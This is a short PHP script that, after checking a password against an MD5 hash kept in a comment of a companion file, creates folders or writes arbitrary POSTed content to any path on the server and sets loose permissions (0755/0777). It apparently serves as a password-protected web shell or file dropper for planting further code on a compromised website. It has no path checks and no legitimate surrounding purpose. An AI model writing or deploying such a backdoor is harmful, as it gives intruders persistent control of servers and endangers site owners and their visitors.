<?php /*17.09.16 
h papka
f file
new.php?s=pass~url~type~prav 
*/
if(!file_exists('./p.php')){exit('[X] PASS Not Exist');}
if(!isset($_POST['s'])){exit('[X]');}
$d=explode('*/',file_get_contents('./p.php'));
$d=explode('/*',$d[0]);$s=explode('~',$_POST['s']); 
if(md5($s[0])!=$d[1]){exit('[X] PASS');}$d = array();

if(!isset($s[1])){exit('[X] NEW no Url');}
if(file_exists($s[1])){exit('[X] NEW exist ('.$s[1].')');}
if(!isset($s[2])){$s[2]='f';}

if($s[2]=='h'){
		if(!isset($s[3])){$s[3]=0777;} //0700
		if(mkdir($s[1], $s[3])){
			echo '[V]';	
		}else{ 
			echo '[X]';
		}
}else{
		if(!isset($_POST['txt'])){ $_POST['txt']=' ';;}
		$fp = fopen($s[1], "w");
		fwrite($fp, $_POST['txt']);
		fclose($fp);

		if(!isset($s[3])){$s[3]=0755;} 
		chmod($s[1], $s[3]);

		if(file_exists($s[1])){
			echo '[V]';			
		}else{
			echo '[X]';
		}	
}

echo ' new';
for($i=1;$i<count($s);$i++){
	echo '~'.$s[$i];
}

?>